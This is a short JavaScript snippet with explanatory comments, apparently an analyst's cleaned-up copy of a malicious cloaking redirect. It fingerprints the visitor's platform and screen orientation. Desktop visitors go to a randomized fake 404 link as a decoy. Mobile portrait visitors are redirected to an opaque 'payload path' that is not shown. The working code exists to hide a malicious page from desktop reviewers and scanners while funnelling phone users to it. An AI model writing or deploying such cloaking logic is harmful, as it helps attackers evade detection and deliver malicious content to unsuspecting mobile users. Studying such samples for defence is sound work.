```js
// Helper function: Generates a random alphanumeric string of length 'l'
const getRandomString = (l) => { return Math.random().toString(36).substring(2, 2 + l); }

// Helper function: Generates a random integer between 'a' and 'b'
const getRandomInt = (a, b) => { return Math.floor(Math.random() * (b - a + 1)) + a; }

// Checks the operating system via navigator.platform
var platformChecks = { win: false, mac: false, xll: false };
var currentPlatform = navigator.platform;

platformChecks.win = currentPlatform.indexOf('Win') == 0;
platformChecks.mac = currentPlatform.indexOf('Mac') == 0;
platformChecks.xll = currentPlatform.indexOf('X11') == 0;

// DECISION LOGIC: Desktop platform OR landscape screen ratio (width > height)
if (platformChecks.win || platformChecks.mac || platformChecks.xll || window.screen.availWidth > window.screen.availHeight) {
    
    // DECOY ROUTE: If desktop/laptop, generate a fake 404 URL with randomized characters and click it
    var decoyLink = document.createElement('a');
    decoyLink.setAttribute('rel', 'noreferrer');
    decoyLink.setAttribute('href', `/404bbb${getRandomString(getRandomInt(1, 10))}`);
    decoyLink.click();

} else {

    // TARGET ROUTE: If mobile device (portrait orientation), proceed to payload path
    top.location.href = `/IJgqFDH/snzdflvhz9OjZr2K7IqXvBfWDsSEpg-amfhzzXvyT0xhPIcQMRVB3hcdI1CWVc-kalhGPvoPy8fGpAIbxmICfj/${Date.now()}` + location.search;

}
```